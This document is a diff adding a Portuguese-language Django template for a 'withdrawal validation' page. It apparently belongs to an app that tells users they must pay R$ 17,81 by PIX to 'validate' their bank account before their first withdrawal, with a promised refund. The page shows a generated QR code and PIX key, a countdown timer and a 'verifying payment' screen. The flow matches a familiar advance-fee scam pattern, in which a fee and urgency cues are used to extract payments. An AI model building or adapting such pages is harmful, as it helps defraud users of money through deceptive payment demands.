@@ -1,0 +1,322 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, viewport-fit=cover">
+    <!-- font -->
+    <link rel="stylesheet" href="{% static 'fonts/fonts.css' %}">
+    <!-- Icons -->
+    <link rel="stylesheet" href="{% static 'fonts/font-icons.css' %}">
+    <link rel="stylesheet" href="{% static 'css/bootstrap.min.css' %}">
+    <link rel="stylesheet" type="text/css" href="{% static 'css/styles.css' %}"/>
+  
+    <!-- Favicon and Touch Icons -->
+    <link rel="shortcut icon" href="{% static 'images/logo/48.png' %}" />
+    <link rel="apple-touch-icon-precomposed" href="{% static 'images/logo/48.png' %}" />
+    <title>Validação de Saque</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+    <style>
+        .icon {
+            font-size: 3em;
+            color: #4caf50;
+            margin-bottom: 20px;
+        }
+
+        .qr-code-img {
+            display: block;
+            margin: 20px auto;
+            width: 200px;
+            height: 200px;
+        }
+
+        #pix-amount, #timer {
+            font-size: 1.2em;
+            font-weight: bold;
+            display: block;
+            text-align: center;
+            margin: 10px 0;
+            color: white;
+        }
+
+        .pix-code {
+            width: 100%;
+            padding: 12px;
+            margin: 20px 0;
+            border: 1px solid #444;
+            border-radius: 6px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+        }
+
+        .styled-button.small {
+            font-size: 1.1em;
+            padding: 12px 24px;
+            margin: 10px 0;
+        }
+
+        p {
+            text-align: center;
+            margin: 10px 0;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1050;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from {opacity: 0;}
+            to {opacity: 1;}
+        }
+
+        .spinner {
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-top: 8px solid #4caf50;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #loading-message {
+            font-size: 18px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <!-- preloade -->
+    <div class="preload preload-container">
+        <div class="preload-logo" style="background-image: url('{% static 'images/logo/144.png' %}')">
+            <div class="spinner"></div>
+        </div>
+    </div>
+    <!-- /preload -->
+    <div class="header fixed-top bg-surface d-flex justify-content-center align-items-center">
+        <a href="{% url 'core:withdraw_balance' %}" class="left back-btn"><i class="icon-left-btn"></i></a>
+        <!-- <h3>Validação de Saque</h3> -->
+    </div>
+    <div class="wrap-boarding pt-45 pb-90">
+        <div class="tf-container">
+            <div class="d-flex flex-column min-vh-100 justify-content-between">
+                {% if validation_status == "pix_created" %}
+                <!-- Show PIX step if already created -->
+                <div id="pix-step" style="display: block;">
+                    <div class="banner-boarding2 mt-20">
+                        <div class="icon"><i class="icon-qrcode"></i></div>
+                    </div>
+                    <div class="content mb-32">
+                        <h2 class="text-center">Realize o Pagamento via PIX</h2>
+                        <p class="mt-8 text-center text-large">Escaneie o QR Code ou copie a chave PIX para concluir a validação.</p>
+                        <img src="data:image/png;base64,{{ qr_code_image }}" alt="QR Code Pix" class="qr-code-img" />
+                        <span id="pix-amount">R$ {{ pix_transaction.amount|floatformat:2 }}</span>
+                        <input type="text" readonly value="{{ pix_transaction.qr_code }}" id="pixcode" class="pix-code" />
+                        <button onclick="copyToClipboard(this)" class="styled-button small">Copiar chave PIX</button>
+                        {% if can_generate_pix %}
+                        <button onclick="generateNewPix()" class="styled-button small">Gerar novo PIX</button>
+                        {% endif %}
+                        <p>Tempo restante para validação: <span id="timer">09:59</span></p>
+                    </div>
+                </div>
+                {% elif validation_status == "payment_reported" %}
+                <!-- Show waiting message -->
+                <div class="banner-boarding mt-30">
+                    <div class="icon"><i class="icon-hourglass-half"></i></div>
+                </div>
+                <div class="content mb-32">
+                    <h2 class="text-center">Verificando pagamento...</h2>
+                    <p class="mt-8 text-center text-large">Aguardando confirmação da validação via Pix. Isso pode levar até 25 minutos.</p>
+                    {% if pix_transaction.paid_at %}
+                    <p><strong>Pagamento confirmado em:</strong> {{ pix_transaction.paid_at|date:"d/m/Y H:i" }}</p>
+                    <p>Seu pagamento foi registrado e está sendo processado.</p>
+                    {% else %}
+                    <div class="spinner"></div>
+                    {% endif %}
+                    <form method="post" action="{% url 'core:reset_validation' %}">
+                        {% csrf_token %}
+                        <button type="submit" class="tf-btn primary md mt-40">Reiniciar Verificação</button>
+                    </form>
+                </div>
+                {% else %}
+                <!-- Full Step 1 -->
+                <div id="full-step1" style="display: block;">
+                    <div class="banner-boarding mt-30">
+                        <div class="icon"><i class="icon-user-check"></i></div>
+                    </div>
+                    <div class="content mb-32">
+                        <h2 class="text-center">Você precisa validar sua conta</h2>
+                        <p class="mt-8 text-center text-large">Para continuar com seu saque, você precisa validar sua conta bancária.</p>
+                        <p class="mt-8 text-center text-large">Notamos que esse será o seu primeiro saque. Para validar sua conta bancária e adicionar uma nova chave PIX de forma segura, precisamos confirmar sua conta bancária.</p>
+                        <button onclick="nextStep(2)" class="tf-btn primary md mt-40">Próximo</button>
+                    </div>
+                </div>
+
+                <!-- Full Step 2 -->
+                <div id="full-step2" style="display: none;">
+                    <div class="banner-boarding2 mt-20">
+                        <div class="icon"><i class="icon-dollar-sign"></i></div>
+                    </div>
+                    <div class="content mb-32">
+                        <h2 class="text-center">Detalhes do Pagamento</h2>
+                        <p class="mt-8 text-center text-large">Faça um pagamento via PIX de R$ 17,81 para validar sua conta bancária. Este valor será reembolsado imediatamente após a confirmação.</p>
+                        <p class="mt-8 text-center text-large">Salientamos que esse valor será reembolsado após a confirmação do recebimento do valor na conta destinatária.</p>
+                        <button onclick="nextStep(3)" class="tf-btn primary md mt-40">Próximo</button>
+                    </div>
+                </div>
+
+                <!-- Full Step 3 -->
+                <div id="full-step3" style="display: none;">
+                    <div class="banner-boarding mt-30">
+                        <div class="icon"><i class="icon-rocket"></i></div>
+                    </div>
+                    <div class="content mb-32">
+                        <h2 class="text-center">Processo Rápido e Seguro</h2>
+                        <p class="mt-8 text-center text-large">Este processo valida sua conta bancária e garante saques seguros. Pronto para começar?</p>
+                        <button onclick="initiatePixGeneration()" class="tf-btn primary md mt-40">Iniciar Validação</button>
+                    </div>
+                </div>
+                <!-- PIX Step -->
+                <div id="pix-step" style="display: none;">
+                    <div class="banner-boarding2 mt-20">
+                        <div class="icon"><i class="icon-qrcode"></i></div>
+                    </div>
+                    <div class="content mb-32">
+                        <h2 class="text-center">Realize o Pagamento via PIX</h2>
+                        <p class="mt-8 text-center text-large">Escaneie o QR Code ou copie a chave PIX para concluir a validação.</p>
+                        <div id="pix-content"></div>
+                    </div>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="spinner"></div>
+        <p id="loading-message">Gerando PIX...</p>
+    </div>
+
+    <script type="text/javascript" src="{% static 'js/bootstrap.min.js' %}"></script>
+    <script type="text/javascript" src="{% static 'js/jquery.min.js' %}"></script>
+    <script type="text/javascript" src="{% static 'js/main.js' %}"></script>
+
+    <script>
+        function nextStep(step) {
+            ['full-step1', 'full-step2', 'full-step3', 'pix-step'].forEach(id => document.getElementById(id).style.display = 'none');
+            document.getElementById(`full-step${step}`).style.display = 'block';
+        }
+
+        function initiatePixGeneration() {
+            const loadingOverlay = document.getElementById('loading-overlay');
+            loadingOverlay.classList.add('active');
+            fetch("{% url 'core:withdraw_validation' %}", {
+                method: 'POST',
+                headers: {
+                    'X-CSRFToken': '{{ csrf_token }}',
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                loadingOverlay.classList.remove('active');
+                if (data.status === 'success') {
+                    ['full-step1', 'full-step2', 'full-step3'].forEach(id => document.getElementById(id).style.display = 'none');
+                    document.getElementById('pix-step').style.display = 'block';
+                    document.getElementById('pix-content').innerHTML = `
+                        <img src="data:image/png;base64,${data.qr_code_image}" alt="QR Code Pix" class="qr-code-img" />
+                        <span id="pix-amount">R$ ${data.amount.toFixed(2).replace('.', ',')}</span>
+                        <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
+                        <button onclick="copyToClipboard(this)" class="styled-button small">Copiar chave PIX</button>
+                        <button onclick="generateNewPix()" class="styled-button small">Gerar novo PIX</button>
+                        <p>Tempo restante para validação: <span id="timer">09:59</span></p>
+                    `;
+                } else {
+                    alert(data.message || 'Erro ao gerar PIX. Tente novamente.');
+                }
+            })
+            .catch(error => {
+                loadingOverlay.classList.remove('active');
+                console.error('Error:', error);
+                alert('Erro ao processar a requisição.');
+            });
+        }
+
+        function copyToClipboard(button) {
+            const pixCode = document.getElementById('pixcode');
+            pixCode.select();
+            document.execCommand('copy');
+            button.innerText = 'Chave copiada!';
+            setTimeout(() => {
+                button.innerText = 'Copiar chave PIX';
+            }, 3000);
+        }
+
+        function generateNewPix() {
+            const loadingOverlay = document.getElementById('loading-overlay');
+            loadingOverlay.classList.add('active');
+            fetch("{% url 'core:withdraw_validation' %}", {
+                method: 'POST',
+                headers: {
+                    'X-CSRFToken': '{{ csrf_token }}',
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                loadingOverlay.classList.remove('active');
+                if (data.status === 'success') {
+                    document.getElementById('pix-content').innerHTML = `
+                        <img src="data:image/png;base64,${data.qr_code_image}" alt="QR Code Pix" class="qr-code-img" />
+                        <span id="pix-amount">R$ ${data.amount.toFixed(2).replace('.', ',')}</span>
+                        <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
+                        <button onclick="copyToClipboard(this)" class="styled-button small">Copiar chave PIX</button>
+                        <button onclick="generateNewPix()" class="styled-button small">Gerar novo PIX</button>
+                        <p>Tempo restante para validação: <span id="timer">09:59</span></p>
+                    `;
+                } else {
+                    alert(data.message || 'Erro ao gerar novo PIX. Tente novamente.');
+                }
+            })
+            .catch(error => {
+                loadingOverlay.classList.remove('active');
+                console.error('Error:', error);
+                alert('Erro ao processar a requisição.');
+            });
+        }
+
+        let countdown = 600;
+        setInterval(() => {
+            if (countdown > 0) countdown--;
+            const minutes = String(Math.floor(countdown / 60)).padStart(2, '0');
+            const seconds = String(countdown % 60).padStart(2, '0');
+            const timerEl = document.getElementById('timer');
+            if (timerEl) timerEl.innerText = `${minutes}:${seconds}`;
+        }, 1000);
+    </script>
+</body>
+</html>
